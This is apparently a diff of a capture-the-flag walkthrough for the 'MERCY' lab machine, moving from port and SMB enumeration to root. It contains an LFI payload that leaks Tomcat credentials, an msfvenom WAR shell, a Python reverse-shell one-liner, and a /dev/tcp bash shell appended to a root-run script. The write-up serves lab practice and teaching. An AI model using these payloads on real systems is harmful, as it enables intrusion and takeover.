@@ -1,3 +1,4 @@
+[*]
 1. Nmap scan
 PORT     STATE    SERVICE
 22/tcp   filtered ssh
@@ -10,14 +11,11 @@ PORT     STATE    SERVICE
 993/tcp  open     imaps
 995/tcp  open     pop3s
 8080/tcp open     http-proxy
-
-
+[*]
 2. Web service found on 8080. Running nikto & gobuster **Note Apache version 1.1, /manager page, robots.txt, and possible PUT method.
 Below gives a very wide range of attack surface. I'm going to run a SMB enum scan, and come back to this
 nikto -h 172.16.16.10 -port 8080
 gobuster -u http://172.16.16.10:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
-
-
 ===============================================================================================================================================================
 /docs (Status: 302)
 /examples (Status: 302)
@@ -50,55 +48,46 @@ Disallow: /tryharder/tryharder
 SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
 
 ===============================================================================================================================================================
+[*]
 3. Ran decodify against found string
 
 [+] Decoded from Base64 : It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.
 
 Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.
-
 No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
-
-
-===============================================================================================================================================================
-
-
+[*]
 4. Enumerating SMB/netbios with enum4linux -a 172.16.16.10
 Note null sessions are allowed, the minimum password is 5 chars, and no complexity or lockouts (brute force her)
-
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
 S-1-22-1-1000 Unix User\pleadformercy (Local User)
 S-1-22-1-1001 Unix User\qiu (Local User)
 S-1-22-1-1002 Unix User\thisisasuperduperlonguser (Local User)
 S-1-22-1-1003 Unix User\fluffy (Local User)
 +] Password Info for Domain: MERCY
-
 	[+] Minimum password length: 5
 	[+] Password history length: None
 	[+] Maximum password age: Not Set
 	[+] Password Complexity Flags: 000000
-
 		[+] Domain Refuse Password Change: 0
 		[+] Domain Password Store Cleartext: 0
 		[+] Domain Password Lockout Admins: 0
 		[+] Domain Password No Clear Change: 0
 		[+] Domain Password No Anon Change: 0
 		[+] Domain Password Complex: 0
-
 	[+] Minimum password age: None
 	[+] Reset Account Lockout Counter: 30 minutes 
 	[+] Locked Account Duration: 30 minutes 
 	[+] Account Lockout Threshold: None
 	[+] Forced Log off Time: Not Set
-
+[*]
 5. Tried password "password" with SMB client user shares
 smbclient //172.16.16.10/qiu -U qiu **password is password**
 downloaded bash_history, config, configprint, and readme.txt
-
-
+[*]
 6. Opened ports with knock 172.16.16.10 159 27391 4, knock 172.16.16.10 17301 28504 9999
 **downloaded knock from github
 **Found knock seqence from file "config" downloaded
-
+[*]
 7. Re-ran nmap scan to verify ports are open
 PORT     STATE SERVICE
 22/tcp   open  ssh
@@ -111,11 +100,10 @@ PORT     STATE SERVICE
 993/tcp  open  imaps
 995/tcp  open  pop3s
 8080/tcp open  http-proxy
-
+[*]
 8. HTTP is now open. re-runing web test with nikto & gobuster
 gobuster -u http://172.16.16.10 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
 nikto -h 172.16.16.10
-
 =====================================================
 2019/04/23 14:31:58 Starting gobuster
 =====================================================
@@ -155,31 +143,29 @@ root@hostmachine:~/Downloads# nikto -h 172.16.16.10
 + /login.html: Admin login page/section found.
 + 7891 requests: 0 error(s) and 14 item(s) reported on remote host
 + End Time:           2019-04-23 14:33:46 (GMT-5) (50 seconds)
-
-
+[*]
 9. Found /nomercy site. Web app RIPS 0.53 found. Got tomcat admin login (for http://172.16.16.10:8080/manager)
 **seachsploit RIPS found it is vulnerable to LFI attacks
 http://172.16.16.10/nomercy/windows/code.php?file=../../../../../../var/lib/tomcat7/conf/tomcat-users.xml
 <? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
 <? <user username="fluffy" password="freakishfluffybunny" roles="none"/> 
-
+[*]
 10. Once logged into http://172.16.16.10:8080/manager as thisisasuperduperlonguser, you can upload "war" file to the server
 nc -nvlp 443 **setup listener**
 msfvenom -p java/jsp_shell_reverse_tcp  LHOST=172.16.16.7 LPORT=443 -f war > shell.war **generate payload**
 **get shell, and generate new reverse connection for stability**
-
+[*]
 11. Created new lister to gain something omre stable
 nc -nvlp 4445 **listen
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.16.7",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 **used that crazy python command to get new reverse shell
 python2.7 -c 'import pty; pty.spawn("/bin/bash")' **make shell more stable/terminal like**
-
-
+[*]
 12. Changed user to "fluffy" with password from the tomcat file
 su - fluffy
 pw =  freakishfluffybunny
 python2.7 -c 'import pty; pty.spawn("/bin/bash")' **make shell more stable/terminal like**
-
+[*]
 13. Looked in directory and found root owned shell code
 ls -l
 fluffy@MERCY:~/.private/secrets$ ls -la
@@ -191,16 +177,15 @@ drwxr-xr-x 3 fluffy fluffy 4096 Nov 20 01:02 ..
 -rw-r--r-- 1 fluffy fluffy   12 Nov 20 01:02 .secrets
 -rwxrwxrwx 1 root   root    222 Nov 20 01:00 timeclock
 fluffy@MERCY:~/.private/secrets$ 
-
-
+[*]
 14. Transfered over pspy32 to check running processes
 ./pspy32
 **found /home/fluffy/.secrets/timelcock running **
-
+[*]
 15. echo bash re-diret into timeclock
 nc -nvlp 8080 **listen on your machine**
 echo '/bin/bash -i > /dev/tcp/172.16.16.7/8080 0<&1 2>&1' >> timeclock **To add bash redirect to root ran script**
-
+[*]
 16. Capture the flag
 root@MERCY:~# cat proof.txt
 cat proof.txt
@@ -222,7 +207,7 @@ Congratulations, once again, for you TRIED HARDER!
 Regards,
 The Author
 root@MERCY:~# 
-
+[*]
 
 
 
